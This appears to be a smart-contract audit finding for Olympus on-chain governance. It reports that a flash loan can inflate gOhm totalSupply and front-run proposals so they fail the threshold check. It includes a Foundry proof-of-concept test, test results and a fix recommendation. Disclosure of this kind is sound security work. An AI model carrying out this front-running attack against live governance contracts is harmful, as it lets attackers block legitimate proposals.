Odd Snowy Lemur

medium

# Proposals are susceptible to denial-of-service (DOS) attacks

## Summary
A user must surpass the proposal threshold to submit a proposal. A malicious user can potentially thwart this process by employing a flash loan to artificially inflate the total supply. Consequently, elevating the proposal threshold may lead to a scenario where the proposer's votes become insufficient compared to the heightened proposal threshold value.
## Vulnerability Detail
In the given scenario:

Assuming the totalSupply of gOhm is 1,000,000 * 10^18, and Alice's balance is 110,000 * 10^18, with a proposal threshold set at 100,000 * 10^18 based on the totalSupply. Since Alice holds more than the proposal threshold, she intends to propose a proposal.

However, Bob, observing Alice's intention, decides to prevent her proposal by front-running her transaction. Bob executes the following steps:

1. **Flash Loan and Staking:**
   - Bob utilizes a flash loan to acquire a substantial amount of Ohm and stakes them in gOhm, effectively increasing the totalSupply of gOhm.

2. **Minting gOhm:**
   - Bob mints 110,000 * 10^18 gOhm, causing the totalSupply to rise to 1,110,000 * 10^18.

3. **Increased Proposal Threshold:**
   - Due to the increased totalSupply, the proposal threshold is also raised to 111,000 * 10^18.

As a result of Bob's actions, Alice's proposal, with her 110,000 * 10^18 gOhm, is now below the new proposal threshold of 111,000 * 10^18. Consequently, Alice's proposal fails since her gOhm holdings are now insufficient relative to the heightened proposal threshold set by Bob's manipulation of the totalSupply.

`test :`
```solidity
   function testCorrectness_exploit() public{
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        string[] memory signatures = new string[](1);
        bytes[] memory calldatas = new bytes[](1);
        string memory description = "Test Proposal";
        address bob = address(3);
        bytes memory Threshold = address(governorBravoDelegator).functionCall(
            abi.encodeWithSignature(
                "getProposalThresholdVotes()"
            )
        );
        uint Threshold1 = abi.decode(Threshold,(uint));
        assertEq(Threshold1,100000 * 10 ** 18); //Proposal Threshhold when the totalSupply = 1000_000 * 10 ** 18
        vm.roll(block.number + 1); // Rolling Block
        gohm.mint(bob,110030 * 10 ** 18); //Minting so that the totalsupply will increase

        bytes memory Threshold2 = address(governorBravoDelegator).functionCall(
            abi.encodeWithSignature(
                "getProposalThresholdVotes()"
            )
        );
        uint Threshold3 = abi.decode(Threshold2,(uint));
        assertEq(Threshold3,111003 * 10 ** 18); //bob influenced the threshold by minting.
        

        vm.prank(alice);
        bytes memory errorr = abi.encodeWithSignature("GovernorBravo_Proposal_ThresholdNotMet()");
        vm.expectRevert(errorr); //Revert due to Alice votes < proposalThreshhold 
        address(governorBravoDelegator).functionCall(
            abi.encodeWithSignature(
                "propose(address[],uint256[],string[],bytes[],string)",
                targets,
                values,
                signatures,
                calldatas,
                description
            )
        );
    }

```

`Result :`
```solidity
[PASS] testCorrectness_executeSucceedsIfProposerBelowThresholdAndWhitelisted() (gas: 573728)
[PASS] testCorrectness_executeUpdatesProposalObjectExecutedState() (gas: 544673)
[PASS] testCorrectness_execute_case1() (gas: 708137)
[PASS] testCorrectness_execute_case2() (gas: 600170)
[PASS] testCorrectness_execute_case3() (gas: 1008213)
[PASS] testCorrectness_exploit() (gas: 81679) //Passing Test
[PASS] testCorrectness_getActions() (gas: 345355)
[PASS] testCorrectness_getProposalThresholdVotes() (gas: 81302)

```
## Impact
Proposals are susceptible to denial-of-service (DOS) attacks. An attacker could deploy a Miner Extractable Value (MEV) bot designed to front-run proposal transactions. This MEV bot executes a series of actions, including flash loan acquisition of Ohm, staking the acquired assets to mint gOhm, and consequently inflating the totalSupply of gOhm. The purpose of this attack is to render the proposal invalid by causing it to be reverted due to the altered totalSupply. By strategically manipulating the transaction order and the state of the system, the attacker disrupts the normal functioning of proposals, potentially causing them to fail
## Code Snippet
https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L135-L138
https://github.com/sherlock-audit/2024-01-olympus-on-chain-governance/blob/main/bophades/src/external/governance/GovernorBravoDelegate.sol#L690-L692
## Tool used

Manual Review

## Recommendation
If obtaining the totalSupply at a specific block is not feasible, it is advisable to adopt a fixed proposal threshold value and incorporate a setter function to adjust the threshold if needed. This approach provides a more stable and predictable mechanism for managing proposal thresholds, allowing for manual adjustments when required